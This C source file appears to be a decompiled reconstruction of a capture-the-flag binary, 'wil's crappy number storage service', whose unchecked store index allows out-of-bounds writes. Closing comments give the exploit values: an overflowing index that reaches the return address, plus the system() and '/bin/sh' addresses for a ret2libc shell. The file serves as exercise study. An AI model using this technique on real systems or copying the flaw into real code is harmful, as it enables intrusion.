#include <stdio.h>
#include <string.h>

void clear_stdin()
{
    unsigned char character;
    character = 0;
    while (character != 10)
    {
        character = (char)getchar();
        if (character != 10)
            character = 255;
    }
}

unsigned get_unum()
{
    unsigned int number;

    number = 0;
    fflush(stdout);
    scanf("%u", &number);
    clear_stdin();
    return (number);
}

int store_number(char *str)
{
    unsigned int number;
    unsigned int index;
    unsigned int store;
    long long result;
    int edx;

    number = 0;
    index = 0;
    printf(" Number: ");
    number = get_unum();
    printf(" Index: ");
    index = get_unum();
    result = index * 2863311531;
    edx = result >> 32; 
    edx = edx >> 1; // /2
    result = edx + edx + edx;
    edx = index - result;
    if (edx == 0 || (store = number >> 24) == 183)
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return (1);
    }
    store = index << 2;
    str[store] = number;
    return (0);
}

int read_number(char *str)
{
    unsigned int index;
    unsigned int store;

    index = 0;
    printf(" Index: ");
    index = get_unum();
    store = index << 2;
    printf(" Number at data[%u] is %u\n", index, str[store]);
    return (0);
}

int main(int ac, char **av, char **env)
{
    char str[100];
    int check; // esp+0x1b4
    char command[20];
    char **argv;
    char **environment;

    argv = av;
    environment = env;
    check = 0;
    memset(command, 0, 4);
    memset(command + 4, 0, 4);
    memset(command + 8, 0, 4);
    memset(command + 12, 0, 4);
    memset(command + 16, 0, 4);
    bzero(str, 100);
    while (*argv)
    {
        memset(*argv, 0, strlen(*argv));
        argv++;
    }
    while (*environment)
    {
        memset(*environment, 0, strlen(*environment));
        environment++;
    }
    puts("----------------------------------------------------\n\
    Welcome to wil's crappy number storage service!\n\
----------------------------------------------------\n\
    Commands:\n\
        store - store a number into the data storage\n\
        read  - read a number from the data storage\n\
        quit  - exit the program\n\
----------------------------------------------------\n\
    wil has reserved some storage :>\n\
----------------------------------------------------\n");
    while (1)
    {
        printf("Input command: ");
        fgets(command, 20, stdin);
        command[strlen(command) - 1] = 0;
        if (strncmp(command, "store", 5) == 0)
            check = store_number(str);
        else if (strncmp(command, "read", 4) == 0)
            check = read_number(str);
        else if (strncmp(command, "quit", 4) == 0)
            break;
        if (check != 0)
            printf(" Failed to do %s command\n", command);
        else
            printf(" Completed %s command successfully\n", command);
        memset(command, 0, 4);
        memset(command + 4, 0, 4);
        memset(command + 8, 0, 4);
        memset(command + 12, 0, 4);
        memset(command + 16, 0, 4);
    }
    return (0);
}

//>>> 2147483762 index to change the return address
//2147483762
//>>> 0xf7e6aed0 // system address
//4159090384
//>>> 0xf7f897ec // address of "/bin/sh"
//4160264172